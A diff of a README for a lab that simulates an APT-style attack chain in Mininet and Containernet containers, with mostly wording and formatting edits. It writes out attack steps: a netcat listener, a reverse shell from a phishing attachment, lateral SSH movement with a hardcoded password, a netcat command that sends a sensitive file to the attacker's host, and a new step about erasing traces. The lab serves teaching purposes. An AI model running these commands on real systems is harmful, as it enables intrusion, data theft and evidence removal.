@@ -20,7 +20,7 @@ This project demonstrates a simulated attack chain inside a Mininet + Containern
 
 sudo docker build -t cloudhopper-host .
 
-# Start the network topology and also create a virtual env (more details on the cantainernet repo)
+# Start the network topology and also create a virtual env (more details in the containernet repo)
 
 sudo -E env PATH=$PATH python3 topology.py
 
@@ -36,34 +36,28 @@ Each host mounts a /data directory containing scenario-specific files.
 # Attack steps
 
 ## 1. Attacker sets up listener on the C2 server
-
 nc -lvnp 4444
 
 ## 2. The MSP employee receives a spearphishing email which contains a malicious attachment. The attachment in downloaded on the employee machine and then clicks on it. The script creates a reverse shell: 
-
 bash /data/open_me.sh
 
 ## 3. Attacker gains shell access and explores the machine/network
-
 cat /data/clients_info.txt
 
 This file contains clients machines IPs and credentials.
 
 ## 4. Lateral movement to a client machine
-
 Using the stolen credentials from the MSP:
-ssh user1@10.0.0.3
 
-Password: pass123
+- ssh user1@10.0.0.3
+- Password: pass123
 
 It finds an important file (sensitive_data.txt) on the client machine.
 
 ## 5. Exfiltration preparation (client1 -> msp)
-
 The attacker exfiltrates the important file back to the MSP machine via scp or any other transfer method. 
 
 ## 6. Exfiltration from MSP to attacker (msp -> attacker)
- 
 Open a new attacker terminal and prepare to receive the stolen file:
 
 nc -lvnp 5555 > stolen.txt
@@ -72,4 +66,5 @@ From the MSP reverse shell:
 
 nc 172.17.0.3 5555 < /data/sensitive_data.txt
 
-The attacker receives the sensitive data into stolen.txt.
+## 7. Final step
+The attacker receives the sensitive data into stolen.txt and erases all the files that he created along the way on the machines.
